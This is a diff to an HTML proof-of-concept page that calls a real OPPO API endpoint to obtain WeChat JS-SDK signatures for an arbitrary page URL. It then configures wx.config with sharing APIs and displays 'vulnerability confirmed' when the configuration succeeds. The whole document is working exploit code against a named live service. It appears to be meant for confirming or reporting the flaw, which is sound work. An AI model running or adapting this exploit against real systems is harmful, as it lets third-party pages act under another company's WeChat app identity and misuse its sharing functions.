@@ -5,23 +5,38 @@
   <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
 </head>
 <body>
-  <p id="result">等待验证...</p>
+  <p id="result">初始化中...</p>
   <script>
-    wx.config({
-      debug: true,  // 开启debug，微信会弹窗显示验证结果
-      appId: 'wxb2dc68f6a51da81d',
-      timestamp: '从接口获取',
-      nonceStr: '从接口获取',
-      signature: '从接口获取',
-      jsApiList: ['updateAppMessageShareData']
-    });
+    const pageUrl = location.href.split('#')[0];
 
-    wx.ready(function() {
-      document.getElementById('result').innerText = '✅ 签名验证通过 - 漏洞确认';
-    });
+    fetch('https://supervooc.oppo.cn/pp/api/public/wxChatScan', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'url=' + encodeURIComponent(pageUrl) + '&type=3'
+    })
+    .then(r => r.json())
+    .then(res => {
+      const d = res.data;
+      document.getElementById('result').innerText = '获取签名成功，配置中...';
 
-    wx.error(function(res) {
-      document.getElementById('result').innerText = '❌ 签名无效: ' + res.errMsg;
+      wx.config({
+        debug: true,
+        appId: d.appId,
+        timestamp: d.timestamp,
+        nonceStr: d.nonceStr,
+        signature: d.signature,
+        jsApiList: ['updateAppMessageShareData', 'onMenuShareTimeline']
+      });
+
+      wx.ready(function() {
+        document.getElementById('result').innerText
+          = '✅ wx.ready() 触发 — 漏洞确认';
+      });
+
+      wx.error(function(err) {
+        document.getElementById('result').innerText
+          = '❌ wx.error: ' + err.errMsg;
+      });
     });
   </script>
 </body>
